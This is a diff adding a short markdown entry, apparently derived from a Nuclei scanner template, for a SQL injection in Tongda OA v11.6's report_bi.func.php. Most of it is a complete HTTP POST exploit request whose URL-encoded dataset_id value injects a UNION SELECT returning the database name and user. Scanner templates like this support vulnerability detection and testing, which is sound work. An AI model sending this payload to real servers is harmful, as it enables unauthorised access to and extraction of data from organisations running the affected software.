@@ -1,0 +1,23 @@
+# Nuclei Template: Tongda OA v11.6 report_bi.func.php - SQL injection
+**Template ID:** tongda-report-func-sqli
+**Vulnerability Class:** SQL Injection
+**Severity:** High
+**CWE:** CWE-89
+**Source:** Nuclei Template (`tongda-report-func-sqli.yaml`)
+
+## Vulnerability Information & PoC
+
+## Description
+Tongda OA v11.6 report_bi.func.php has a SQL injection vulnerability, and attackers can obtain database information through the vulnerability.
+
+## Steps to reproduce / Exploit Payload
+```http
+POST /general/bi_design/appcenter/report_bi.func.php HTTP/1.1
+Host: {{Hostname}}
+Content-Type: application/x-www-form-urlencoded
+
+_POST[dataset_id]=efgh%27-%40%60%27%60%29union+select+database%28%29%2C2%2Cuser%28%29%23%27&action=get_link_info&
+```
+
+## References
+- https://github.com/PeiQi0/PeiQi-WIKI-Book/blob/main/docs/wiki/oa/%E9%80%9A%E8%BE%BEOA/%E9%80%9A%E8%BE%BEOA%20v11.6%20report_bi.func.php%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md
